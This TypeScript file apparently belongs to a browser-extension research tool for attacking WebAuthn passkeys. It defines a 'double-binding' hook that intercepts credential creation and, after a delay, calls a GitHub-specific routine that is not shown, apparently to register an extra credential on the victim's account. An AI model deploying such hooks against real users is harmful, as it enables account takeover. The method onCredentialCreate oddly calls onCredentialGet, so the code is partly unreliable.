import { AttackHook } from '../attacks/attack_hook';
import { disabledIcons, enabledIcons } from '../constants';
import { getLogger } from '../logging';
import { getOriginFromUrl, prepareWebauthnCreateRequest, webauthnParse, webauthnStringify } from '../utils';
import { generateKeyRequestAndAttestation, generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../webauthn';
import { AttackHookNone } from './attack_hook_none';
import { DoubleBindingImplementationGithub } from './double_binding_implementations/double_binding_implementation_github';

const log = getLogger('background');

export class AttackHookDoubleBinding extends AttackHookNone {
    static implementations = {
        [DoubleBindingImplementationGithub.MATCH_DOMAIN]: new DoubleBindingImplementationGithub()
    };

    getName(): string {
        return 'attack-double-binding';
    }

    onNetwork(details: chrome.webRequest.WebRequestBodyDetails): chrome.webRequest.BlockingResponse {
        const domain = new URL(details.url).hostname;
        if(domain in AttackHookDoubleBinding.implementations) {
            AttackHookDoubleBinding.implementations[domain].onNetwork(details);
        }

        return { cancel: false };
    }

    async onCredentialCreate(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
        
        console.log("attack_hook_double_bind onCredentialCreate");
        const originalReturn = await super.onCredentialGet(msg, sender) as WebAuthnResponseMessage;

        const createdCredential = webauthnParse(originalReturn.credential);

        // Run this in paralell after a little bit, so we return with no delay and the original request is processed
        // TODO: add some hook to verify the original request is done
        setTimeout(async () => {
            const domain = new URL(sender.url).hostname;
            if(domain in AttackHookDoubleBinding.implementations) {
                AttackHookDoubleBinding.implementations[domain].onCredentialCreate(msg, sender, createdCredential);
            }

        }, 3000);

        return originalReturn;
    }

    async onCredentialGet(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
        return await super.onCredentialGet(msg, sender);
    }
}
